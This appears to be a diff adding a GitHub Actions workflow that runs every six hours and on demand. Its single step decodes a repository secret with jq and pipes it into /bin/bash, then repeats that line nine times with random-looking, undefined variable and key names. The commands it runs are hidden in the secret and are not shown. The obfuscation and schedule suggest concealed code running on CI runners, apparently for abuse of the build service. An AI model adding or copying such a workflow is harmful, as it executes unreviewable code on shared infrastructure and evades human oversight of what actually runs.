@@ -1,0 +1,25 @@
+name: jiangzehong1293
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangzehong1293
+        env:
+          d806: ${{ secrets.d806 }}
+        run: |
+          echo $d806 | jq -r .kcpr2076 | /bin/bash
+          echo $lgr6838 | jq -r .omw61 | /bin/bash
+          echo $y025 | jq -r .yqx5 | /bin/bash
+          echo $voxi4 | jq -r .ikk6 | /bin/bash
+          echo $xyrko3 | jq -r .t3828 | /bin/bash
+          echo $go056 | jq -r .nwk1 | /bin/bash
+          echo $vmdjf74864 | jq -r .dpsyl464 | /bin/bash
+          echo $asqcc79616 | jq -r .wvgz0 | /bin/bash
+          echo $zcb1045 | jq -r .yyqh770 | /bin/bash
+          echo $ovxs2 | jq -r .ft45538 | /bin/bash
+
